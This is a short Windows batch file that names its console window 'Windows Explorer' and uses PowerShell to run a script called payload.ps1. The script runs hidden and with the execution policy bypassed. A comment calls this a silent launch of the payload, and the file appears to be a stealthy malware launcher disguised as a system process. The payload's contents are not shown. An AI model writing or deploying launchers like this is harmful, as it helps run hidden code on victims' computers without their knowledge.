@echo off
title Windows Explorer

:: Silent launch of the payload - kills the PowerShell window after it starts
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0payload.ps1"
exit
